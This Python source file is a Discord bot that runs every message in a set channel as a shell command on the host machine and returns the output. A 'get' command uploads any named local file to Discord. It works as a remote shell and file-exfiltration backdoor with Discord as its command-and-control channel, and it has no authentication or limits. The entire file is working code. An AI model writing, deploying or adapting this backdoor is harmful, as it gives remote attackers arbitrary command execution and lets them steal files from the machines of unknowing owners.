import discord
import subprocess
import os

# Discord bot token (replace with your bot token)
TOKEN = 'YOUR_TOKEN'

# Discord channel ID where commands will be received and results will be sent
CHANNEL_ID = YOUR_CHANNEL_ID

# Define intents
intents = discord.Intents.default()
intents.message_content = True

# Create a Discord client with intents
client = discord.Client(intents=intents)

# Event triggered when the bot is ready
@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

# Function to split text into chunks of 2000 characters or fewer
def split_chunks(text, chunk_size=2000):
    return [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]

# Event triggered when a message is received
@client.event
async def on_message(message):
    if message.channel.id == CHANNEL_ID and not message.author.bot:
        # Split command into parts
        command_parts = message.content.split()

        # Check if command is "cd"
        if command_parts[0] == "cd":
            # Change directory (if specified)
            if len(command_parts) > 1:
                try:
                    os.chdir(command_parts[1])
                    await message.channel.send(f'Changed directory to {os.getcwd()}')
                except Exception as e:
                    await message.channel.send(f'Error changing directory: {e}')
            else:
                await message.channel.send('Usage: cd <directory>')
        elif command_parts[0] == "get":
            # Check if file name is provided
            if len(command_parts) > 1:
                file_name = command_parts[1]
                # Check if file exists
                if os.path.exists(file_name):
                    # Upload file to Discord
                    with open(file_name, 'rb') as file:
                        await message.channel.send(f'Uploading file: {file_name}')
                        await message.channel.send(file=discord.File(file))
                else:
                    await message.channel.send(f'File not found: {file_name}')
            else:
                await message.channel.send('Usage: get <file name>')
        else:
            # Execute command
            process = subprocess.Popen(command_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            output = stdout.decode() + stderr.decode()

            # Split output into chunks of 2000 characters or fewer
            chunks = split_chunks(output)
            for chunk in chunks:
                await message.channel.send(f'```\n{chunk}\n```')

# Start the bot
client.run(TOKEN)
